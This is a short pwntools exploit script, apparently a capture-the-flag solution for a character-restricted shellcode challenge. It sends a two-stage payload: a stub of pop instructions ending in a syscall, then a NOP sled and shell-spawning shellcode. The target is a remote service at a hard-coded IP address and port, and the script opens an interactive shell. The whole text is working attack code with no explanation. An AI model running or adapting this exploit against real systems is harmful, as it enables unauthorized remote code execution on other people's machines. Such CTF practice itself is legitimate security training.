from pwn import *

context.arch = "amd64"


restrict = "ZZJ loves shell_code,and here is a gift:\017\005 enjoy it!\n"

def check(x):
	return x in restrict

payload = asm("""
pop rdx
pop rdx
pop rdx
pop rdx
pop rdi
pop rdi
syscall
""")

#r = process(["./shellcode"])
r = remote("34.92.37.22", 10002)
r.sendlineafter(":",payload)
r.recvrepeat(1)
r.send("\x90"*0x20+asm(shellcraft.sh()))

r.interactive()
